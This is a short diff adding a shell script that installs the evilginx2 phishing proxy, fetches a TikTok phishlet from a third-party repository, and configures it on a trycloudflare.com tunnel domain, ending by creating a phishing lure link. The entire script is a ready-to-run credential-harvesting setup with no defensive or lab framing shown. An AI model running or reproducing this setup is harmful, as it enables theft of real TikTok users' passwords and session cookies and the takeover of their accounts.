@@ -1,0 +1,15 @@
+sudo apt update && sudo apt install -y make golang-go git curl
+git clone https://github.com/kgretzky/evilginx2.git
+cd evilginx2
+make
+sudo make install
+mkdir -p ./phishlets
+curl -L -o ./phishlets/tiktok.yaml https://raw.githubusercontent.com/An0nUD4Y/evilginx2-phishlets/master/tiktok.yaml
+sudo ./evilginx2 -p ./phishlets <<EOF
+config domain recommend-manufactured-deposits-employees.trycloudflare.com
+config certificates proxy true
+phishlets hostname tiktok recommend-manufactured-deposits-employees.trycloudflare.com
+phishlets enable tiktok
+lures create tiktok
+lures get 0
+EOF
